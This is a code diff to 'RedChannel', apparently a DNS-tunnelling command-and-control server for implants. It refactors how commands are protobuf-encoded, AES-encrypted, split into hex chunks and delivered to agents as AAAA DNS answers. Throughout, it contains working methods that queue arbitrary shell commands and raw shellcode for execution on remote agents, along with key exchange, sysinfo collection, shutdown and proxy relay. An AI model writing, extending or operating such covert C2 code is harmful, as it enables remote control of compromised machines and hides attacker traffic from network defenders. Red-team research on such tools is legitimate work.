@@ -173,17 +173,21 @@ export default class RedChannel {
         if (!agentId) {
             // broadcast keyx if no agent is specified
             for (const id of this.agents.keys()) {
-                this.queueData(id, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey);
+                this.queueData(id, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey).catch((ex) => {
+                    this.log.error(`error queueing data for agent ${id}: ${emsg(ex)}`);
+                });
             }
             this.log.info(`broadcasting keyx`);
             return;
         }
 
-        if (this.agents.has(agentId)) {
-            this.queueData(agentId, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey);
-        } else {
-            this.log.error(`agent ${agentId} does not exist`);
-        }
+        this.queueData(agentId, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey)
+            .then(() => {
+                this.log.warn(`keyx started with agent ${agentId}`);
+            })
+            .catch((ex) => {
+                this.log.error(`error queueing data for agent ${agentId}: ${emsg(ex)}`);
+            });
         return;
     }
 
@@ -191,15 +195,21 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, implant.AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
+        this.queueData(agentId, implant.AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
     }
 
     sendCommandShell(agentId: string, shellCommand: string) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE, shellCommand);
+        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
     }
 
-    sendCommandExecShellcode(agentId: string, shellcode) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE_SHELLCODE, shellcode);
+    sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
+        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE_SHELLCODE, shellcode).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
     }
 
     // agent must be able to decrypt the tag to execute shutdown
@@ -207,11 +217,15 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
+        this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
     }
 
     sendCommandSetConfig(agentId: string, config: string) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, config);
+        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, Buffer.from(config)).catch((ex) => {
+            this.log.error(`error queueing data: ${emsg(ex)}`);
+        });
     }
 
     /**
@@ -222,17 +236,24 @@ export default class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    queueData(agentId: string, command: implant.AgentCommand, data: string) {
+    async queueData(agentId: string, command: implant.AgentCommand, data: Buffer, configData?: implant.AgentConfig) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
 
-        let dataPayload: string = "";
+        const commandProto = implant.Command.Request.create({
+            command: command,
+            input: data,
+            config: configData,
+        });
 
-        // keyx payload is just our key, unencrypted
-        if (command === implant.AgentCommand.AGENT_KEYX) dataPayload = data;
-        else dataPayload = this.encryptPayload(data, agent.secret);
+        let commandProtoBuffer = Buffer.from(implant.Command.Request.encode(commandProto).finish());
 
-        const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
+        // keyx commands are not encrypted
+        if (command !== implant.AgentCommand.AGENT_KEYX) {
+            commandProtoBuffer = this.encryptPayload(commandProtoBuffer, agent.secret);
+        }
+
+        const dataBlocks = commandProtoBuffer.toString("hex").match(/[a-f0-9]{1,4}/g);
         if (!dataBlocks) throw new Error(`invalid encrypted payload`);
 
         // prettier-ignore
@@ -249,7 +270,6 @@ export default class RedChannel {
 
         let records: string[] = [];
         let paddedBytes = 0;
-        let record = "";
         for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
             const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
 
@@ -269,18 +289,19 @@ export default class RedChannel {
             }
 
             // prettier-ignore
-            record =
-            Config.RECORD_DATA_PREFIX +
+            records.push(
+                Config.RECORD_DATA_PREFIX +
                 ":" +
                 this.padZero(recordNum.toString(16), 4) +
                 ":" +
-                blocksPerIp.join(":");
-            records.push(record);
+                blocksPerIp.join(":")
+            );
 
+            // add the header record to the top of the array
             if (totalCommands > 1 && (records.length == Config.MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                 // prettier-ignore
-                record =
-                Config.RECORD_HEADER_PREFIX +
+                records.unshift(
+                    Config.RECORD_HEADER_PREFIX +
                     ":" +
                     dataId +
                     ":" +
@@ -289,9 +310,8 @@ export default class RedChannel {
                     ":" +
                     this.padZero(totalRecords.toString(16), 4) +
                     ":" +
-                    "0000:0000:0000:0001";
-
-                records.unshift(record);
+                    "0000:0000:0000:0001"
+                );
 
                 agent.sendq.push(records);
                 records = [];
@@ -299,8 +319,8 @@ export default class RedChannel {
         }
         if (totalCommands == 1) {
             // prettier-ignore
-            record =
-            Config.RECORD_HEADER_PREFIX +
+            records.unshift(
+                Config.RECORD_HEADER_PREFIX +
                 ":" +
                 dataId +
                 ":" +
@@ -309,8 +329,8 @@ export default class RedChannel {
                 ":" +
                 this.padZero(totalRecords.toString(16), 4) +
                 ":" +
-                "0000:0000:0000:0001";
-            records.unshift(record);
+                "0000:0000:0000:0001"
+            );
         }
 
         // set to false after keyx is received and there are no more keyx in sendq
@@ -319,14 +339,14 @@ export default class RedChannel {
         if (records.length > 0) {
             agent.sendq?.push(records);
             if (this.modules.proxy.config.enabled && agent.channel == AgentChannel.PROXY) {
-                this.modules.proxy.sendToProxy(agent.id, records);
+                await this.modules.proxy.sendToProxy(agent.id, records);
 
                 // cleanup sendq if proxying to agent
                 agent.sendq = [];
             }
         }
-        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
-        //console.log("`- records: " + JSON.stringify(records));
+        this.log.debug(`queued up ${totalRecords} records in ${totalCommands} command(s) for agent: ${agentId}`);
+        this.log.debug(`records: ${JSON.stringify(records, null, 2)}`);
     }
 
     padZero(proxyData, max_len) {
@@ -357,7 +377,7 @@ export default class RedChannel {
     }
 
     makeIpString(last_byte) {
-        return `${Config.RECORD_HEADER_PREFIX}:0000:${implant.AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
+        return `${Config.RECORD_HEADER_PREFIX}:0000:${this.padZero(implant.AgentCommand.AGENT_IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${last_byte}`;
     }
 
     /**
@@ -441,9 +461,11 @@ export default class RedChannel {
         if (!this.agents.has(agentId)) {
             this.initAgent(agentId, channel);
             this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
-
-            this.log.warn(`keyx started with agent ${agentId}`);
-            this.sendCommandKeyx(agentId);
+            try {
+                this.sendCommandKeyx(agentId);
+            } catch (ex) {
+                this.log.error(`error sending keyx: ${emsg(ex)}`);
+            }
         }
         const agent = this.agents.get(agentId)!;
 
@@ -455,7 +477,11 @@ export default class RedChannel {
             command = parseInt(segments[2].slice(0, 2), 16);
         } catch (ex) {
             this.log.error(`failed to parse command: ${emsg(ex)}`);
+            return res.end();
+        }
 
+        if (!Object.values(implant.AgentCommand).includes(command)) {
+            this.log.error(`invalid command: ${command}`);
             return res.end();
         }
 
@@ -469,11 +495,10 @@ export default class RedChannel {
             if (agent.sendq?.length == 0) {
                 // 03 means no data to send
                 this.log.debug(`agent ${agentId} checking in, no data to send`);
-                const noDataStatus = this.makeIpString(AgentStatus.NO_DATA);
                 res.answer.push({
                     name: hostname,
                     type: "AAAA",
-                    data: noDataStatus,
+                    data: this.makeIpString(AgentStatus.NO_DATA),
                     ttl: ttl,
                 });
 
@@ -526,7 +551,7 @@ export default class RedChannel {
             chunkNumber = parseInt(segments[2].slice(2, 4), 16);
             totalChunks = parseInt(segments[2].slice(4, 6), 16);
         } catch (ex) {
-            this.log.error(`message: invalid chunk numbers, current: ${chunkNumber}, total: ${totalChunks}`);
+            this.log.error(`error parsing chunk number and total chunks, current: ${chunkNumber}, total: ${totalChunks}: ${emsg(ex)}`);
             return res.end();
         }
 
@@ -686,11 +711,10 @@ export default class RedChannel {
         return AgentStatus.DATA_RECEIVED;
     }
 
-    encryptPayload(data: string, secret: Buffer): string {
+    encryptPayload(data: Buffer, secret: Buffer): Buffer {
         const buffer = Buffer.from(data);
         const cipher = this.crypto.aesEncrypt(buffer, secret);
-        const payload = this.makeEncryptedBufferStringHex(cipher);
-        return payload;
+        return Buffer.concat([cipher.iv, cipher.data]);
     }
 
     decryptAgentData(agentId: string, data: string) {
